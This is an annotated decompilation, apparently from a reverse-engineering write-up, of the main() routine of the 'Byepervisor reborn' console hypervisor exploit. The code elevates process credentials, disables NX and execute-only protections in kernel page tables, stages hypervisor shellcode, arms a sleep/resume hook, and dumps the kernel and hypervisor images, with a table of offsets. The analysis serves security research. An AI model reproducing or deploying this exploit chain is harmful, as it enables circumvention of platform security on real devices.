# 01 — `main()` flow

Decompile from Hopper, annotated. Trimmed to logic (debug `printf` kept where useful).

```c
int main(void) {
    printf("[+] Byepervisor reborn v1\n");

    uint32_t fw = kernel_get_fw_version();
    printf("[+] Detected firmware: %x.%02x\n", (fw >> 24) & 0xff, (fw >> 16) & 0xff);

    // kdlsym(0x6) == 0 means firmware unknown → bail
    if (kdlsym(0x6) == 0) {
        printf("[!] Undetected firmware, exiting!\n");
        notifyf("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
        return 0;
    }

    // Model split by SoC ID
    uint32_t soc = sceKernelGetMainSocId();
    if (soc == 0x840FD0) {
        g_hv_base_pa = 0x8E0800000;        // Pro
        notifyf("Byepervisor Reborn\nDetected pro model (0x%x)", soc);
    } else {
        g_hv_base_pa = 0x62800000;         // Regular
        notifyf("Byepervisor Reborn\nDetected regular model (0x%x)", soc);
    }

    // Elevate current proc to debug-authid
    kernel_set_ucred_authid(getpid(), 0x4800000000000007);

    uint64_t ksym9  = kdlsym(0x9);
    uint64_t cookie_addr = ksym9 + 0x440;

    pin_to_core();

    // "Cookie" present? means HV already pwned on a prior boot
    if (kread64(cookie_addr) != 0) {
        /* === Already-compromised fast path === */
        char kname[0x40], hname[0x40];
        snprintf(kname, 0x40, "/data/%x.%02x_kernel_%lx.bin",
                 (fw>>24)&0xff, (fw>>16)&0xff, ktext(0));
        snprintf(hname, 0x40, "/data/%x.%02x_hv_%lx.bin",
                 (fw>>24)&0xff, (fw>>16)&0xff, g_hv_base_pa);
        printf("Hypervisor is already compromised\n");
        dump_kernel_text(kname);
        dump_hv_image(g_hv_base_pa, 0x2000000, hname);

        kHexDump(ktext(0), 0x60);
        kHexDump(kdldmap(g_hv_base_pa + 0x72830), 0x60);  // HV core strings

        kwrite64(ktext(8), 0x41414141);                    // RW proof
        kHexDump(ktext(0), 0x60);
        return 0;
    }

    /* === Full exploit path === */
    kwrite(ksym9 + 0x1000, break_hv, break_hv_len);        // stage HV shellcode
    uint64_t ksym8 = kdlsym(0x8);
    uint64_t cr3   = kread64(ksym8 + 0x28);

    // 1. Clear NX (bit 63) on the four PT levels covering 0x3FFFF000
    clear_nx_at(ksym8, kdldmap(0x3ffff000));

    // 2. Defeat XOTEXT on every kernel .text page
    printf("[+] Disabling xotext + enabling write...\n");
    for (uint64_t va = ktext(0); va < *KERNEL_ADDRESS_DATA_BASE; va += 0x1000) {
        uint64_t pde = find_pde(ksym8, va, &entry);
        if (pde != ~0UL)
            kwrite64(pde, (entry & ~0x0400000000000000) | 0x2);
        uint64_t pte = find_pte(ksym8, va, &entry);
        if (pte != ~0UL)
            kwrite64(pte, (entry & ~0x0400000000000000) | 0x2);
    }

    // 3. khook already armed from a previous run?
    if (kread64(ksym9 + 0x600) == 0x4B484F4F4B454401 /* "KHOOKED\x01" */) {
        printf("khook: hook already ARMED (state survived)\n");
    } else {
        printf("[+] Installing hook...\n");
        if (install_resume_hook(0, ksym9, cr3) != 0) {
            printf("[!] Failed to install hook (likely too large)\n");
            notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
            return -1;
        }
        printf("[+] Hook installed, enter sleep and resume!\n");
        notifyf("Byepervisor Reborn\nEntering rest mode in 3 secs\n");
        sleep(3);
        sceSystemStateMgrEnterStandby();
    }

    // 4. Resume: wait for HV-side chain to drop cookie
    uint64_t cookie;
    for (;;) {
        pin_to_core();
        cookie = kread64(cookie_addr);
        if (cookie != 0) break;
        sceKernelSleep(5);
    }
    notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx",
            cookie);

    // 5. Clean up + dump
    uninstall_hook(0, ksym9);
    char kname[0x40], hname[0x40];
    snprintf(kname, 0x40, "/data/%x.%02x_kernel_%lx.bin",
             (fw>>24)&0xff, (fw>>16)&0xff, ktext(0));
    snprintf(hname, 0x40, "/data/%x.%02x_hv_%lx.bin",
             (fw>>24)&0xff, (fw>>16)&0xff, g_hv_base_pa);
    dump_kernel_text(kname);
    dump_hv_image(g_hv_base_pa, 0x2000000, hname);
    return 0;
}
```

### Notes

* `kdlsym` is an index-based resolver; the handful of indices used in `main` are:

  | idx | role |
  |-----|------|
  | 0x6 | HV-side hook target (0 ⇒ unknown firmware) |
  | 0x7 | HV offset stored into chain slot `0x3FFFFF00` |
  | 0x8 | kernel data base — contains CR3 at `+0x28` |
  | 0x9 | khook-scratch region: cookie at `+0x440`, state marker at `+0x600`, shellcode staging at `+0x1000` |
  | 0xA | PML4 base (passed to `kh_set_tables`) |
  | 0xB | Direct-map base |

* The marker literal `0x4B484F4F4B454401` is ASCII `KHOOKED` + version byte `0x01`.
* HV-core offset `+0x72830` is the string table hex-dumped as a "we did it" trophy.
